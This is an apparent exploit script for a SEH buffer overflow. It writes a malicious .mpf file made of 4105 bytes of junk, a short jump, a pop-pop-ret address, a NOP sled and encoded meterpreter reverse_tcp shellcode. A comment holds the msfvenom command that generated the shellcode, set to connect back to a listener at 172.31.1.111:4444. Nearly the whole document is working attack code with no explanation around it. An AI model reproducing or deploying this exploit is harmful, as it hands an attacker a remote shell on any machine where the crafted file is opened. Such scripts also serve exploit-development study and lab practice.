#[*] Exact match at offset 4109
#0x1001f668 : pop ebp # pop ecx # ret
#badchars 00, 0a, 0d, 1a
#msfvenom -p windows/meterpreter/reverse_tcp RHOST=172.31.1.111 RPORT=4444 -f c -a x86 -b "\x00\x0a\x0d\x1a"



file = "seh2.mpf"


shellcode ="\x90"*30
shellcode +=("\xbb\xca\x92\x21\x77\xd9\xcc\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x54\x31\x5e\x13\x83\xc6\x04\x03\x5e\xc5\x70\xd4\x8b\x31\xf6"
"\x17\x74\xc1\x97\x9e\x91\xf0\x97\xc5\xd2\xa2\x27\x8d\xb7\x4e"
"\xc3\xc3\x23\xc5\xa1\xcb\x44\x6e\x0f\x2a\x6a\x6f\x3c\x0e\xed"
"\xf3\x3f\x43\xcd\xca\x8f\x96\x0c\x0b\xed\x5b\x5c\xc4\x79\xc9"
"\x71\x61\x37\xd2\xfa\x39\xd9\x52\x1e\x89\xd8\x73\xb1\x82\x82"
"\x53\x33\x47\xbf\xdd\x2b\x84\xfa\x94\xc0\x7e\x70\x27\x01\x4f"
"\x79\x84\x6c\x60\x88\xd4\xa9\x46\x73\xa3\xc3\xb5\x0e\xb4\x17"
"\xc4\xd4\x31\x8c\x6e\x9e\xe2\x68\x8f\x73\x74\xfa\x83\x38\xf2"
"\xa4\x87\xbf\xd7\xde\xb3\x34\xd6\x30\x32\x0e\xfd\x94\x1f\xd4"
"\x9c\x8d\xc5\xbb\xa1\xce\xa6\x64\x04\x84\x4a\x70\x35\xc7\x02"
"\xb5\x74\xf8\xd2\xd1\x0f\x8b\xe0\x7e\xa4\x03\x48\xf6\x62\xd3"
"\xaf\x2d\xd2\x4b\x4e\xce\x23\x45\x94\x9a\x73\xfd\x3d\xa3\x1f"
"\xfd\xc2\x76\xb5\xf8\x54\xd5\x55\x02\xcb\x4d\x68\x04\x02\xd2"
"\xe5\xe2\x74\xba\xa5\xba\x34\x6a\x06\x6b\xdc\x60\x89\x54\xfc"
"\x8a\x43\xfd\x96\x64\x3a\x55\x0e\x1c\x67\x2d\xaf\xe1\xbd\x4b"
"\xef\x6a\x34\xab\xa1\x9a\x3d\xbf\xd5\xfa\xbd\x3f\x25\x97\xbd"
"\x55\x21\x31\xe9\xc1\x2b\x64\xdd\x4d\xd4\x43\x5d\x89\x2a\x12"
"\x54\xe1\x1c\x80\xd8\x9d\x60\x44\xd9\x5d\x36\x0e\xd9\x35\xee"
"\x6a\x8a\x20\xf1\xa6\xbe\xf8\x67\x49\x97\xad\x20\x21\x15\x8b"
"\x06\xee\xe6\xfe\x15\xe9\x19\x7c\x3b\x52\x72\x7e\x7b\x62\x82"
"\x14\x7b\x32\xea\xe3\x54\xbd\xda\x0c\x7f\x96\x72\x86\x11\x54"
"\xe2\x97\x38\x38\xba\x98\xce\xe1\xab\x16\x31\x16\xd4\xd8\x0e"
"\xc0\xed\xae\x57\xd0\x49\xa0\xe2\x75\xfb\x2b\x0c\x29\xfb\x79")

header = "http:AA"

junk = "A"*4105
nseh = "\xeb\x1e\x90\x90" #jump 30
seh = "\x68\xf6\x01\x10" # pop pop retn


buffer = header + junk + nseh + seh + shellcode


f = open(file, 'w')
f.write(buffer)
f.close()

